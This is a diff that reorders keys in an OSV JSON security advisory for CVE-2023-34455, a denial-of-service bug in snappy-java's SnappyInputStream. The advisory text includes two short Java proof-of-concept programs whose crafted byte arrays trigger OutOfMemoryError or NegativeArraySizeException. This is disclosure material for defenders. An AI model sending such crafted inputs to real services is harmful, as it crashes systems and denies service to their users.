@@ -1,65 +1,17 @@
 {
-  "id": "GHSA-qcwq-55hx-v3vh",
-  "summary": "snappy-java's unchecked chunk length leads to DoS",
-  "details": "## Summary\nDue to use of an unchecked chunk length, an unrecoverable fatal error can occur.\n## Impact\nDenial of Service\n## Description\nThe code in the function [hasNextChunk](https://github.com/xerial/snappy-java/blob/05c39b2ca9b5b7b39611529cc302d3d796329611/src/main/java/org/xerial/snappy/SnappyInputStream.java#L388) in the file [SnappyInputStream.java](https://github.com/xerial/snappy-java/blob/master/src/main/java/org/xerial/snappy/SnappyInputStream.java) checks if a given stream has more chunks to read. It does that by attempting to read 4 bytes. If it wasn\u2019t possible to read the 4 bytes, the function returns false. Otherwise, if 4 bytes were available, the code treats them as the length of the next chunk.\n\n\n\n```java\n        int readBytes = readNext(header, 0, 4);\n        if (readBytes < 4) {\n            return false;\n        }\n\n        int chunkSize = SnappyOutputStream.readInt(header, 0);\n        if (chunkSize == SnappyCodec.MAGIC_HEADER_HEAD) {\n            .........\n        }\n\n        // extend the compressed data buffer size\n        if (compressed == null || chunkSize > compressed.length) {\n            compressed = new byte[chunkSize];\n        }\n\n```\n\nIn the case that the \u201ccompressed\u201d variable is null, a byte array is allocated with the size given by the input data. Since the code doesn\u2019t test the legality of the \u201cchunkSize\u201d variable, it is possible to pass a negative number (such as 0xFFFFFFFF which is -1), which will cause the code to raise a \u201cjava.lang.NegativeArraySizeException\u201d exception. A worse case would happen when passing a huge positive value (such as 0x7FFFFFFF), which would raise the fatal \u201cjava.lang.OutOfMemoryError\u201d error.\n\n\n## Steps To Reproduce\nCompile and run the following code:\n\n```java\npackage org.example;\nimport org.xerial.snappy.SnappyInputStream;\n\nimport java.io.*;\n\npublic class Main {\n\n    public static void main(String[] args) throws IOException {\n        byte[] data = {-126, 'S', 'N', 'A', 'P', 'P', 'Y', 0, 0, 0, 0, 0, 0, 0, 0, 0,(byte) 0x7f, (byte) 0xff, (byte) 0xff, (byte) 0xff};\n        SnappyInputStream in = new SnappyInputStream(new ByteArrayInputStream(data));\n        byte[] out = new byte[50];\n        try {\n            in.read(out);\n        }\n        catch (Exception ignored) {\n\n        }\n    }\n}\n```\n\nThe program will crash with the following error (or similar), even though there is a catch clause, since \u201cOutOfMemoryError\u201d does not get caught by catching the \u201cException\u201d class:\n\n```\nException in thread \"main\" java.lang.OutOfMemoryError: Requested array size exceeds VM limit\n\tat org.xerial.snappy.SnappyInputStream.hasNextChunk(SnappyInputStream.java:422)\n\tat org.xerial.snappy.SnappyInputStream.read(SnappyInputStream.java:167)\n\tat java.base/java.io.InputStream.read(InputStream.java:217)\n\tat org.example.Main.main(Main.java:12)\n\n```\n\n\nAlternatively - compile and run the following code:\n\n```java\npackage org.example;\nimport org.xerial.snappy.SnappyInputStream;\n\nimport java.io.*;\n\npublic class Main {\n\n    public static void main(String[] args) throws IOException {\n        byte[] data = {-126, 'S', 'N', 'A', 'P', 'P', 'Y', 0, 0, 0, 0, 0, 0, 0, 0, 0,(byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff};\n        SnappyInputStream in = new SnappyInputStream(new ByteArrayInputStream(data));\n        byte[] out = new byte[50];\n        in.read(out);\n    }\n}\n```\n\nThe program will crash with the following error (or similar):\n\n```\nException in thread \"main\" java.lang.NegativeArraySizeException: -1\n\tat org.xerial.snappy.SnappyInputStream.hasNextChunk(SnappyInputStream.java:422)\n\tat org.xerial.snappy.SnappyInputStream.read(SnappyInputStream.java:167)\n\tat java.base/java.io.InputStream.read(InputStream.java:217)\n\tat org.example.Main.main(Main.java:12)\n\n```\n\n\nIt is important to note that these examples were written by using a flow that is generally used by developers, and can be seen for example in the Apache project \u201cflume\u201d: https://github.com/apache/flume/blob/f9dbb2de255d59e35e3668a5c6c66a268a055207/flume-ng-channels/flume-file-channel/src/main/java/org/apache/flume/channel/file/Serialization.java#L278. Since they used try-catch, the \u201cNegativeArraySizeException\u201d exception won\u2019t harm their users, but the \u201cOutOfMemoryError\u201d error can.",
-  "aliases": [
-    "CVE-2023-34455"
-  ],
-  "modified": "2024-02-17T05:36:43.827976Z",
-  "published": "2023-06-15T17:15:06Z",
-  "related": [
-    "CGA-644v-gq8j-xww8",
-    "CVE-2023-34455"
-  ],
-  "database_specific": {
-    "nvd_published_at": "2023-06-15T18:15:09Z",
-    "cwe_ids": [
-      "CWE-770"
-    ],
-    "severity": "HIGH",
-    "github_reviewed": true,
-    "github_reviewed_at": "2023-06-15T17:15:06Z"
-  },
-  "references": [
-    {
-      "type": "WEB",
-      "url": "https://github.com/xerial/snappy-java/security/advisories/GHSA-qcwq-55hx-v3vh"
-    },
-    {
-      "type": "ADVISORY",
-      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-34455"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/xerial/snappy-java/commit/3bf67857fcf70d9eea56eed4af7c925671e8eaea"
-    },
-    {
-      "type": "PACKAGE",
-      "url": "https://github.com/xerial/snappy-java"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/xerial/snappy-java/blob/05c39b2ca9b5b7b39611529cc302d3d796329611/src/main/java/org/xerial/snappy/SnappyInputStream.java#L388"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/xerial/snappy-java/blob/master/src/main/java/org/xerial/snappy/SnappyInputStream.java"
-    },
-    {
-      "type": "WEB",
-      "url": "https://security.netapp.com/advisory/ntap-20230818-0009"
-    }
-  ],
   "affected": [
     {
+      "database_specific": {
+        "last_known_affected_version_range": "<= 1.1.10.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/06/GHSA-qcwq-55hx-v3vh/GHSA-qcwq-55hx-v3vh.json"
+      },
       "package": {
-        "name": "org.xerial.snappy:snappy-java",
         "ecosystem": "Maven",
+        "name": "org.xerial.snappy:snappy-java",
         "purl": "pkg:maven/org.xerial.snappy/snappy-java"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "0"
@@ -67,7 +19,8 @@
             {
               "fixed": "1.1.10.1"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
@@ -146,18 +99,65 @@
         "1.1.8.4",
         "1.1.9.0",
         "1.1.9.1"
-      ],
-      "database_specific": {
-        "last_known_affected_version_range": "<= 1.1.10.0",
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/06/GHSA-qcwq-55hx-v3vh/GHSA-qcwq-55hx-v3vh.json"
-      }
+      ]
     }
+  ],
+  "aliases": [
+    "CVE-2023-34455"
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-770"
+    ],
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-06-15T17:15:06Z",
+    "nvd_published_at": "2023-06-15T18:15:09Z",
+    "severity": "HIGH"
+  },
+  "details": "## Summary\nDue to use of an unchecked chunk length, an unrecoverable fatal error can occur.\n## Impact\nDenial of Service\n## Description\nThe code in the function [hasNextChunk](https://github.com/xerial/snappy-java/blob/05c39b2ca9b5b7b39611529cc302d3d796329611/src/main/java/org/xerial/snappy/SnappyInputStream.java#L388) in the file [SnappyInputStream.java](https://github.com/xerial/snappy-java/blob/master/src/main/java/org/xerial/snappy/SnappyInputStream.java) checks if a given stream has more chunks to read. It does that by attempting to read 4 bytes. If it wasn\u2019t possible to read the 4 bytes, the function returns false. Otherwise, if 4 bytes were available, the code treats them as the length of the next chunk.\n\n\n\n```java\n        int readBytes = readNext(header, 0, 4);\n        if (readBytes < 4) {\n            return false;\n        }\n\n        int chunkSize = SnappyOutputStream.readInt(header, 0);\n        if (chunkSize == SnappyCodec.MAGIC_HEADER_HEAD) {\n            .........\n        }\n\n        // extend the compressed data buffer size\n        if (compressed == null || chunkSize > compressed.length) {\n            compressed = new byte[chunkSize];\n        }\n\n```\n\nIn the case that the \u201ccompressed\u201d variable is null, a byte array is allocated with the size given by the input data. Since the code doesn\u2019t test the legality of the \u201cchunkSize\u201d variable, it is possible to pass a negative number (such as 0xFFFFFFFF which is -1), which will cause the code to raise a \u201cjava.lang.NegativeArraySizeException\u201d exception. A worse case would happen when passing a huge positive value (such as 0x7FFFFFFF), which would raise the fatal \u201cjava.lang.OutOfMemoryError\u201d error.\n\n\n## Steps To Reproduce\nCompile and run the following code:\n\n```java\npackage org.example;\nimport org.xerial.snappy.SnappyInputStream;\n\nimport java.io.*;\n\npublic class Main {\n\n    public static void main(String[] args) throws IOException {\n        byte[] data = {-126, 'S', 'N', 'A', 'P', 'P', 'Y', 0, 0, 0, 0, 0, 0, 0, 0, 0,(byte) 0x7f, (byte) 0xff, (byte) 0xff, (byte) 0xff};\n        SnappyInputStream in = new SnappyInputStream(new ByteArrayInputStream(data));\n        byte[] out = new byte[50];\n        try {\n            in.read(out);\n        }\n        catch (Exception ignored) {\n\n        }\n    }\n}\n```\n\nThe program will crash with the following error (or similar), even though there is a catch clause, since \u201cOutOfMemoryError\u201d does not get caught by catching the \u201cException\u201d class:\n\n```\nException in thread \"main\" java.lang.OutOfMemoryError: Requested array size exceeds VM limit\n\tat org.xerial.snappy.SnappyInputStream.hasNextChunk(SnappyInputStream.java:422)\n\tat org.xerial.snappy.SnappyInputStream.read(SnappyInputStream.java:167)\n\tat java.base/java.io.InputStream.read(InputStream.java:217)\n\tat org.example.Main.main(Main.java:12)\n\n```\n\n\nAlternatively - compile and run the following code:\n\n```java\npackage org.example;\nimport org.xerial.snappy.SnappyInputStream;\n\nimport java.io.*;\n\npublic class Main {\n\n    public static void main(String[] args) throws IOException {\n        byte[] data = {-126, 'S', 'N', 'A', 'P', 'P', 'Y', 0, 0, 0, 0, 0, 0, 0, 0, 0,(byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff};\n        SnappyInputStream in = new SnappyInputStream(new ByteArrayInputStream(data));\n        byte[] out = new byte[50];\n        in.read(out);\n    }\n}\n```\n\nThe program will crash with the following error (or similar):\n\n```\nException in thread \"main\" java.lang.NegativeArraySizeException: -1\n\tat org.xerial.snappy.SnappyInputStream.hasNextChunk(SnappyInputStream.java:422)\n\tat org.xerial.snappy.SnappyInputStream.read(SnappyInputStream.java:167)\n\tat java.base/java.io.InputStream.read(InputStream.java:217)\n\tat org.example.Main.main(Main.java:12)\n\n```\n\n\nIt is important to note that these examples were written by using a flow that is generally used by developers, and can be seen for example in the Apache project \u201cflume\u201d: https://github.com/apache/flume/blob/f9dbb2de255d59e35e3668a5c6c66a268a055207/flume-ng-channels/flume-file-channel/src/main/java/org/apache/flume/channel/file/Serialization.java#L278. Since they used try-catch, the \u201cNegativeArraySizeException\u201d exception won\u2019t harm their users, but the \u201cOutOfMemoryError\u201d error can.",
+  "id": "GHSA-qcwq-55hx-v3vh",
+  "modified": "2024-02-17T05:36:43.827976Z",
+  "published": "2023-06-15T17:15:06Z",
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/xerial/snappy-java/security/advisories/GHSA-qcwq-55hx-v3vh"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-34455"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/xerial/snappy-java/commit/3bf67857fcf70d9eea56eed4af7c925671e8eaea"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/xerial/snappy-java"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/xerial/snappy-java/blob/05c39b2ca9b5b7b39611529cc302d3d796329611/src/main/java/org/xerial/snappy/SnappyInputStream.java#L388"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/xerial/snappy-java/blob/master/src/main/java/org/xerial/snappy/SnappyInputStream.java"
+    },
+    {
+      "type": "WEB",
+      "url": "https://security.netapp.com/advisory/ntap-20230818-0009"
+    }
+  ],
+  "related": [
+    "CGA-644v-gq8j-xww8",
+    "CVE-2023-34455"
   ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V3",
-      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "type": "CVSS_V3"
     }
-  ]
+  ],
+  "summary": "snappy-java's unchecked chunk length leads to DoS"
 }
